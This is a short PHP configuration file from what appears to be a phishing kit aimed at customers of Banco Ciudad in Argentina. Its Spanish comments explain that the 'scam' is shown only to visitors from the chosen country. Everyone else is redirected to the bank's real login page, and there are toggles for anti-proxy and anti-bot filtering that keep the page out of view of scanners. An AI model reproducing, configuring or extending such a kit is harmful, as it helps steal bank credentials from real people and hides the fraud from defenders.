<?php
/**
###############################################
#         Version 2.0                         #
#         https://t.me/neo_net                #
#         The Wine Juggler of FUD             #
###############################################
**/


/* Localhost = 0 Abre todo el trafico / Localhost = 1 Bloquea el trafico & redirecciona paises */
$localhost = 1;

/* Con localhost=1; y pais='ES' solo se mostrará el scam a españa */
/* Como cambiar el pais ? https://www.iban.com/country-codes usaremos alpha-2 code :D */
$pais = 'AR';

/* Redireccionar a usuarios que no son del pais configurado, ingresa la url aquí */
$location_x = 'https://hb.bancociudad.com.ar/login';

/* Antiproxies habilitado ?, Deshabilitalo si tienes problemas */
$antiproxies = 0;

/* Antibots habilitado? No es recomendable deshabilitar */
$antibots = 0;

